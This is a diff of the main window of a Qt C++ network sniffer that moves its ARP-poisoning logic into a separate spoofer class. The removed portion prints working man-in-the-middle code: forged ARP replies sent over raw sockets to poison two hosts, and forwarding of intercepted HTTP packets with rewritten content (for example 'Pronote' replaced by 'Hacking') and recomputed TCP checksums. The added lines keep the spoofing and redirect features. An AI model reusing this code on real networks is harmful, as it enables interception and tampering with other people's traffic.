@@ -17,8 +17,6 @@ MainWindow::MainWindow(QWidget *parent) :
     ui->pb_arp->setEnabled(false);
     ui->pb_redirect->setCheckable(true);
     ui->tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows);
-    client1 = NULL;
-    client2 = NULL;
     counter = 0;
 
     thread = new QThread();
@@ -36,27 +34,24 @@ MainWindow::MainWindow(QWidget *parent) :
     connect(ui->pb_load, SIGNAL(clicked()), this, SLOT(Load()));
     connect(ui->pb_save, SIGNAL(clicked()), this, SLOT(Save()));
 
-    int                  one = 1;
-    const int            *val = &one;
-
-    _socket_arp = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
-    setsockopt(_socket_arp, IPPROTO_IP, IP_HDRINCL, (char *) val, sizeof(one));
-
     ui->pb_arp->setCheckable(true);
+    ui->pb_block->setEnabled(false);
+
+    // Linux specific : ARP mostly
+//#ifdef __linux__
     connect(ui->pb_arp, SIGNAL(clicked()), this, SLOT(ArpPoisoning()));
-#ifdef __linux__
     connect(ui->pb_block, SIGNAL(clicked()), this, SLOT(BlockIp()));
-#endif
-//StartSniffing("wlan0");
+
+    ui->pb_block->setEnabled(true);
+    _arp_spoofer.Initialize();
+//#endif
 }
 
 MainWindow::~MainWindow()
 {
     delete ui;
+
 #ifdef __linux__
-    ::close(_socket_arp);
-
-
     for (std::list<std::string>::iterator it = this->_blocked_ip.begin(); it != this->_blocked_ip.end(); it++)
     {
         char    str_cmd[100];
@@ -72,6 +67,7 @@ MainWindow::~MainWindow()
 void    MainWindow::Clear()
 {
     sniffer->mutex.lock();
+
     ui->tableWidget->clearContents();
     ui->tableWidget->setRowCount(0);
     for (std::list<SniffedPacket *>::iterator it = sniffer->Packets.begin(); it != sniffer->Packets.end(); it++)
@@ -80,24 +76,25 @@ void    MainWindow::Clear()
     for (std::list<SniffedPacket *>::iterator it = this->Packets.begin(); it != this->Packets.end(); it++)
         delete *it;
     this->Packets.clear();
+
     sniffer->mutex.unlock();
 }
 
 void    MainWindow::getNewPackets()
 {
-    if (counter++ == 20)
+    if (counter++ == 20) // I don't have time for a proper way
     {
         counter = 0;
-        this->refreshArp();
+        _arp_spoofer.SendArpRedirectRequest();
     }
 
     sniffer->mutex.lock();
 
     for (std::list<SniffedPacket *>::iterator it = sniffer->Packets.begin(); it != sniffer->Packets.end(); it++)
     {
-        checkArp(*(*it));
+        if (ui->pb_redirect->isChecked())
+        _arp_spoofer.ManageNewPacket(*(*it));
         insertPacket(*(*it));
-        //replaceTCPText(*(*it), "img src=", "img src=\"http://upload.wikimedia.org/wikipedia/fr/f/fb/C-dans-l'air.png\" ");
     }
 
     sniffer->Packets.clear();
@@ -147,7 +144,10 @@ void                MainWindow::StartSniffing(const std::string &interface)
     sniffer->Initialize(interface);
     thread->start();
     ui->pb_sniff->setText("STOP");
+
+//#ifdef __linux__
     ui->pb_arp->setEnabled(true);
+//#endif
 }
 
 void                MainWindow::ToggleSniffer()
@@ -161,21 +161,19 @@ void                MainWindow::ToggleSniffer()
             thread->wait();
         }
         this->sniffer->DeInitialize();
-        ui->pb_sniff->setText("START");
-        if (client1 != NULL)
-        {
-            delete client1;
-            delete client2;
-            client1 = NULL;
 
-            ui->pb_arp->setDown(true);
+        ui->pb_sniff->setText("START");
+        if (ui->pb_arp->isChecked())
+        {
+            _arp_spoofer.Stop();
+            ui->pb_arp->setChecked(false);
         }
         ui->pb_arp->setEnabled(false);
 
         return ;
     }
 
-    DialogInterface win(this, _ip, _mac);
+    DialogInterface win(this, _local_ip, _local_mac);
     win.exec();
 }
 
@@ -319,304 +317,20 @@ void                  MainWindow::Load()
 
 void                MainWindow::StartArp(const std::string &ip1, char *mac1, const std::string &ip2, char *mac2)
 {
-    client_t    *client = new client_t;
-    client->ip = ip1;
-    memcpy(client->mac, mac1, 6);
-    client1 = client;
-
-    client = new client_t;
-    client->ip = ip2;
-    memcpy(client->mac, mac2, 6);
-    client2 = client;
-
-    ui->pb_arp->setDown(true);
+    _arp_spoofer.Start(_local_ip, _local_mac, ip1, mac1, ip2, mac2);
+    ui->pb_arp->setChecked(true);
 }
 
 void                MainWindow::ArpPoisoning()
 {
-    if (client1 != NULL)
+    if (ui->pb_arp->isChecked())
     {
-        delete client1;
-        delete client2;
-        client1 = NULL;
-
-        ui->pb_arp->setDown(false);
+        _arp_spoofer.Stop();
+        ui->pb_arp->setChecked(false);
 
         return;
     }
-
-    if (!this->sniffer->IsSniffing())
-        return;
 
     Dialogarp win(this);
     win.exec();
 }
-
-void            MainWindow::refreshArp()
-{
-#ifdef __linux__
-    if (client1 == NULL || client2 == NULL || !this->sniffer->IsSniffing())
-        return;
-
-    int                 sock;
-    char                packet[PKTLEN];
-    struct ether_header *eth = (struct ether_header *) packet;
-    struct ether_arp    *arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
-    struct sockaddr_ll  device;
-
-    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-    if (sock < 0)
-        qDebug() << "fail socket";
-
-    client_t    *client = client1;
-    for (int i = 0; i < 2; ++i)
-    {
-        // To
-        sscanf((client == client1 ? client2->ip : client1->ip).c_str(), "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
-                                       (int *) &arp->arp_spa[1],
-                                       (int *) &arp->arp_spa[2],
-                                       (int *) &arp->arp_spa[3]);
-        // From
-        std::memcpy(arp->arp_tha, client->mac, 6);
-        // By
-        std::memcpy(arp->arp_sha, _mac, 6);
-
-        memcpy(eth->ether_dhost, arp->arp_tha, ETH_ALEN);
-        memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
-        eth->ether_type = htons(ETH_P_ARP);
-
-        arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
-        arp->ea_hdr.ar_pro = htons(ETH_P_IP);
-        arp->ea_hdr.ar_hln = ETH_ALEN;
-        arp->ea_hdr.ar_pln = IP4LEN;
-        arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
-
-        memset(&device, 0, sizeof(device));
-        device.sll_ifindex = if_nametoindex(this->interface.c_str());
-        device.sll_family = AF_PACKET;
-        memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
-        device.sll_halen = htons(ETH_ALEN);
-
-        sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
-        client = client2;
-    }
-
-    ::close(sock);
-#endif
-}
-
-void    MainWindow::checkArp(SniffedPacket &packet)
-{
-    if (!ui->pb_redirect->isChecked() || client1 == NULL || client2 == NULL || !packet.has_ether_hdr)
-        return;
-
-    eth_hdr_t *eth = (eth_hdr_t *) packet.data;
-    if (strncmp(eth->ether_dhost, _mac, 6))
-        return;
-
-    if (packet.ip_dest == _ip || packet.ip_source == _ip || !(strncmp(eth->ether_shost, client1->mac, 6) || strncmp(eth->ether_shost, client2->mac, 6)))
-        return ;
-
-    //qDebug("Size: %d:", packet.size - ETHER_HDR_SIZE - packet.iphdr_size - sizeof(TCP_HDR));
-    int nb_bytes_added = 0;
-   // nb_bytes_added += replaceTCPText(packet, "Content-Length: 96", "Content-Length:161");
-    //nb_bytes_added += replaceTCPText(packet, "img src=", "img src=\"http://upload.wikimedia.org/wikipedia/fr/f/fb/C-dans-l'air.png\" "); // 65
-    nb_bytes_added += replaceTCPText(packet, "Accept-Encoding:", "Accept-Rubbish!:");
-    nb_bytes_added += replaceTCPText(packet, "Pronote", "Hacking");
-    if (false && nb_bytes_added)
-    {
-        static std::string Field_Content_Length = "Content-Length: ";
-
-        char *content_length = (char *) memmem(packet.data, packet.size, Field_Content_Length.c_str(), Field_Content_Length.length());
-
-        if (content_length != NULL)
-        {
-            content_length += Field_Content_Length.length();
-            char *end_content_length = content_length;
-            while (isdigit(*end_content_length))
-                end_content_length++;
-
-            char value_content_length[10];
-            unsigned nb_char_in_number = end_content_length - content_length;
-            std::memcpy(value_content_length, content_length, nb_char_in_number);
-            value_content_length[nb_char_in_number] = '\0';
-            std::string content_length = "Content-Length: ";
-            content_length.append(value_content_length);
-
-            std::stringstream ss;
-            ss << value_content_length;
-            int nb_from_string;
-            ss >> nb_from_string;
-
-            nb_from_string += nb_bytes_added;
-            std::string new_value_content_length = std::to_string(nb_from_string);
-
-            bool remove_space_from_content_length = false;
-            if (new_value_content_length.length() > nb_char_in_number)
-                remove_space_from_content_length = true;
-
-            std::string new_content_length;
-            new_content_length.append("Content-Length:");
-            if (!remove_space_from_content_length)
-                new_content_length.append(" ");
-            new_content_length.append(new_value_content_length);
-
-            replaceTCPText(packet, content_length, new_content_length);
-        }
-
-        // get content-length: %d
-        // Increment with nb_bytes_added
-        // If one number added > add space, else without space
-    }
-
-
-    struct sockaddr_in   sin;
-
-    IP_HDR  *ip_hdr = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);
-
-    sin.sin_family = AF_INET;
-    sin.sin_port = 0;
-    sin.sin_addr.s_addr = ip_hdr->ip_destaddr;
-
-    sendto(_socket_arp, packet.data + ETHER_HDR_SIZE, packet.size - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
-}
-
-void    *memmem(const void *haystack, size_t hlen, const void *needle, size_t nlen)
-{
-    int needle_first;
-    const void *p = haystack;
-    size_t plen = hlen;
-
-    if (!nlen)
-        return NULL;
-
-    needle_first = *(unsigned char *)needle;
-
-    while (plen >= nlen && (p = memchr(p, needle_first, plen - nlen + 1)))
-    {
-        if (!memcmp(p, needle, nlen))
-            return (void *)p;
-
-        p = ((char *) p) + 1;
-        plen = hlen - (((char *) p) - (char *) haystack);
-    }
-
-    return NULL;
-}
-
-void DumpHex(const void* data, size_t size) {
-    char ascii[17];
-    size_t i, j;
-
-    ascii[16] = '\0';
-    for (i = 0; i < size; ++i) {
-        //qDebug("%02X ", ((unsigned char*)data)[i]);
-        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
-            ascii[i % 16] = ((unsigned char*)data)[i];
-        } else {
-            ascii[i % 16] = '.';
-        }
-        if ((i+1) % 8 == 0 || i+1 == size) {
-            //qDebug(" ");
-            if ((i+1) % 16 == 0) {
-                qDebug("|  %s ", ascii);
-            } else if (i+1 == size) {
-                ascii[(i+1) % 16] = '\0';
-                if ((i+1) % 16 <= 8) {
-                    //qDebug(" ");
-                }
-                for (j = (i+1) % 16; j < 16; ++j) {
-                    //qDebug("   ");
-                }
-                qDebug("|  %s ", ascii);
-            }
-        }
-    }
-}
-
-int    MainWindow::replaceTCPText(SniffedPacket &packet, const std::string &find, const std::string &replace)
-{
-    if (!(packet.protocol == "TCP" && (packet.sport == 80 || packet.dport == 80)))
-        return 0;
-
-    std::vector<std::size_t>    indexes;
-    char                        *found;
-    char                        *buffer = packet.data;
-    while ((found = (char *) memmem(buffer, packet.size - (buffer - packet.data), find.c_str(), find.length())) != NULL)
-    {
-        indexes.push_back((long) found - (long) packet.data);
-        qDebug() << "Found at index: " << indexes.at(indexes.size() - 1);
-        buffer = (char *) ((long) found + find.length());
-    }
-
-
-
-    if (!indexes.size())
- {
-        qDebug("NOT FOUND");
-        return 0;
-}
-
-DumpHex(packet.data, packet.size);
-
-    int     nb_bytes_added = replace.length() * indexes.size() - find.length() * indexes.size();
-    int     new_size = packet.size + nb_bytes_added;
-    char    *data = new char[new_size * 2];
-    std::memmove(data, packet.data, packet.size);
-    delete packet.data;
-    packet.size = new_size;
-    packet.data = data;
-
-    for (std::size_t i = 0; i < indexes.size(); ++i)
-    {
-        qDebug() << "Replacing";
-        std::memmove(&data[indexes[i] + replace.length()], &data[indexes[i] + find.length()], packet.size - indexes[i] - find.length());
-        std::memcpy(&data[indexes[i]], replace.c_str(), replace.length());
-    }
-
-    // Modify TCP Checksum
-    IP_HDR      *iphdr = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);
-    TCP_HDR     *tcphdr = (TCP_HDR *) ((char *) iphdr + packet.iphdr_size);
-    uint32_t    sum = 0;
-    uint16_t    padding = 0;
-    uint16_t    proto_tcp = 6;
-    uint16_t    w16;
-    char        *datasum = (char *) tcphdr;
-    int         size_tcp_segment = packet.size - packet.iphdr_size - ETHER_HDR_SIZE;
-    uint16_t    old_checksum = tcphdr->checksum;
-    tcphdr->checksum = 0;
-
-    if (size_tcp_segment & 1)
-    {
-        padding = 1;
-        datasum[size_tcp_segment] = 0;
-    }
-    for (int i = 0; i < size_tcp_segment + padding; i = i + 2)
-    {
-        w16 = ((datasum[i] << 8) & 0xFF00) + (datasum[i + 1] & 0xFF);
-        sum += (unsigned long) (w16);
-    }
-    for (int i = 0; i < 4; i = i + 2)
-    {
-        w16 = ((((char *) &iphdr->ip_srcaddr)[i] << 8) & 0xFF00) + (((char *) &iphdr->ip_srcaddr)[i + 1] & 0xFF);
-        sum += (w16);
-        w16 = ((((char *) &iphdr->ip_destaddr)[i] << 8) & 0xFF00) + (((char *) &iphdr->ip_destaddr)[i + 1] & 0xFF);
-        sum += (w16);
-    }
-
-    sum += (proto_tcp) + (size_tcp_segment);
-    while (sum >> 16)
-        sum = (sum & 0xFFFF) + (sum >> 16);
-    sum = ~sum;
-
-
-    qDebug("Dumping");
-    DumpHex(packet.data, packet.size);
-    qDebug("TcpCheck %04x -> %04x == %04x", old_checksum, htons(sum), (unsigned short) sum);
-    tcphdr->checksum = htons(sum);
-    iphdr->ip_total_length = size_tcp_segment + packet.iphdr_size;
-    qDebug("Size packet: %d // Ip total: %d", packet.size, iphdr->ip_total_length);
-
-    return nb_bytes_added;
-}
-
